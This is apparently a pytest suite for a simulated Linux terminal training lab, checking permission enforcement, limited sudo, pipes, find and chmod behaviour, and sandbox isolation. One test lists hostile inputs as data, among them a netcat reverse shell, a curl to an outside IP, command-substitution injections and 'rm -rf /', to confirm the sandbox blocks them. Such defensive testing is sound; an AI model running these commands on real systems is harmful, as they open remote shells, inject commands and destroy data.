import pytest

from app.terminal.engine import Lab
from app.terminal.labs import NIGHT_WATCH_COMMANDS, build_night_watch


@pytest.fixture()
def lab():
    return Lab(build_night_watch(), NIGHT_WATCH_COMMANDS)


def run(lab, cmd):
    return lab.run(cmd)


def test_basics(lab):
    assert run(lab, "pwd") == ("/home/intern", 0)
    assert run(lab, "whoami") == ("intern", 0)
    assert "uid=1001(intern)" in run(lab, "id")[0]
    assert run(lab, "cd /var/log && pwd")[0] == "/var/log"
    assert run(lab, "cd ~ ; pwd")[0] == "/home/intern"


def test_permissions_are_enforced_not_faked(lab):
    assert run(lab, "cat /etc/shadow") == ("cat: /etc/shadow: Permission denied", 1)
    assert "Permission denied" in run(lab, "ls /root")[0]
    assert "Permission denied" in run(lab, "cd /root")[0]
    assert run(lab, "cat /root/.bash_history")[1] != 0
    # writing where intern has no right
    assert "Permission denied" in run(lab, "echo x > /etc/passwd")[0]
    assert "Permission denied" in run(lab, "echo x >> /var/log/auth.log")[0]
    assert "Operation not permitted" in run(lab, "chmod 777 /etc/passwd")[0]


def test_sudo_is_limited_to_the_sudoers_rule(lab):
    assert "not allowed" in run(lab, "sudo cat /etc/shadow")[0]
    assert "not allowed" in run(lab, "sudo bash")[0] or "command not found" in run(lab, "sudo bash")[0]
    assert run(lab, "sudo chmod 640 /srv/www/config.php")[1] == 0
    assert lab.s["fs"]["/srv/www/config.php"]["m"] == 0o640
    assert run(lab, "sudo whoami")[0] != "root"          # whoami not in sudo rules


def test_pipes_redirection_and_lists(lab):
    out, _ = run(lab, "grep 'Failed password' /var/log/auth.log | wc -l")
    assert out == "21"
    assert run(lab, "echo hi > ~/note.txt; cat ~/note.txt")[0] == "hi"
    assert run(lab, "echo more >> ~/note.txt; wc -l ~/note.txt")[0].startswith("2")
    assert run(lab, "false_cmd || echo fallback")[0].endswith("fallback")
    assert run(lab, "ls /nonexistent 2>/dev/null")[0] == ""
    out, _ = run(lab, "grep -c root /etc/passwd")
    assert out == "2"        # the root and toor lines
    assert run(lab, "cat /etc/passwd | grep -v nologin | cut -d: -f1 | sort | head -n 2")[0] == "deploy\nintern"


def test_find_perm_semantics(lab):
    suid = run(lab, "find / -perm -4000 -type f 2>/dev/null")[0].splitlines()
    assert sorted(suid) == ["/usr/bin/passwd", "/usr/bin/sudo", "/usr/local/bin/healthcheck"]
    ww = run(lab, "find / -perm -002 -type f 2>/dev/null")[0].splitlines()
    assert "/opt/backup/backup.sh" in ww and "/etc/passwd" not in ww
    assert run(lab, "find /home -name '*.txt'")[0].count("\n") >= 1
    assert "Permission denied" in run(lab, "find / -name x")[0]      # stderr surfaced without redirect


def test_chmod_modes(lab):
    run(lab, "sudo chmod u-s /usr/local/bin/healthcheck")
    assert lab.s["fs"]["/usr/local/bin/healthcheck"]["m"] == 0o755
    run(lab, "sudo chmod o-r,g-w /srv/www/config.php")
    assert lab.s["fs"]["/srv/www/config.php"]["m"] == 0o640
    assert "invalid mode" in run(lab, "sudo chmod bogus /srv/www/config.php")[0]


def test_sed_in_place_and_stdout(lab):
    out, _ = run(lab, "sed 's/Port 2222/Port 22/' /etc/ssh/sshd_config | grep Port")
    assert "Port 22" in out and "Port 2222" not in out
    assert "Permission denied" in run(lab, "sed -i 's/a/b/' /etc/hostname")[0]    # no sudo -> no write
    run(lab, "sudo sed -i 's/PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config")
    assert "PermitRootLogin no" in lab.s["fs"]["/etc/ssh/sshd_config"]["c"]


def test_nothing_touches_the_host(lab):
    import os, socket
    # absolute host paths resolve inside the model only
    assert run(lab, "cat /etc/hostname")[0] == "mfs-gateway-01"
    assert os.uname().nodename != "mfs-gateway-01"
    assert run(lab, "cat /proc/self/environ")[1] != 0
    assert run(lab, "ls /mnt")[1] != 0
    # no shell metacharacter execution
    for evil in ("$(id)", "`id`", "ls; $(touch /tmp/pwned)", "cat /etc/passwd > /tmp/../etc/hacked", "python3 -c 'import os'",
                 "bash", "sh -c id", "curl http://203.0.113.45", "wget x", "nc -e /bin/sh 1.2.3.4 1", "rm -rf /", "./nonexistent"):
        out, code = run(lab, evil)
        assert code != 0 or "hacked" not in out
    assert not os.path.exists("/tmp/pwned") and not os.path.exists("/etc/hacked")
    assert "script execution is disabled" in run(lab, "/home/deploy/deploy.sh")[0]


def test_limits_and_robustness(lab):
    assert "too long" in run(lab, "echo " + "a" * 600)[0]
    assert run(lab, "echo 'unterminated")[1] == 2
    assert run(lab, "ls |")[1] == 2
    assert run(lab, "| ls")[1] == 2
    assert run(lab, "")[0] == ""
    big = run(lab, "cat /var/log/auth.log /var/log/auth.log /var/log/nginx/access.log " * 1)[0]
    assert len(big) <= 20100
    # quota on files
    for i in range(30):
        run(lab, f"echo {'x'*100} >> ~/f.txt")
    assert len(lab.s["fs"]["/home/intern/f.txt"]["c"]) <= 10000


def test_disabled_commands_not_found():
    lab = Lab(build_night_watch(), ["pwd", "ls"])
    assert "command not found" in lab.run("cat /etc/passwd")[0]
    assert lab.run("pwd")[1] == 0
